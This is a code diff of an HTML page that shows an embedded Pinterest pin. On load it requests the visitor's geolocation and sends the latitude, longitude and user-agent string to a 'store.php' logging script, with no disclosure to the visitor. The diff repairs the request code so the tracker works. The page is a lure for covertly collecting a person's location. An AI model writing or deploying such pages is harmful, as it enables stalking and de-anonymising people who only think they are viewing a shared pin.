@@ -2,35 +2,30 @@
 <html>
 <body onload="getLocation()">
 
-    <iframe src="https://assets.pinterest.com/ext/embed.html?id=30047522508364731" 
-    height="445" width="345" frameborder="0" scrolling="no" ></iframe>
+  <iframe src="https://assets.pinterest.com/ext/embed.html?id=30047522508364731" 
+    height="445" width="345" frameborder="0" scrolling="no"></iframe>
 
+  <p id="demo"></p>
 
+  <script>
+    const x = document.getElementById("demo");
 
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else { 
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
 
-<p id="demo"></p>
-
-<script>
-const x = document.getElementById("demo");
-
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
-
-function showPosition(position) {
-
-    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" +  position.coords.longitude +
-        "&uagent=" + navigator.userAgent
-    );
-    xhttp.send();
-
-  
-}
-</script>
+    function showPosition(position) {
+      const xhttp = new XMLHttpRequest();
+      xhttp.open("GET", "store.php?lat=" + position.coords.latitude + 
+                          "&long=" + position.coords.longitude +
+                          "&uagent=" + navigator.userAgent);
+      xhttp.send();
+    }
+  </script>
 
 </body>
 </html>
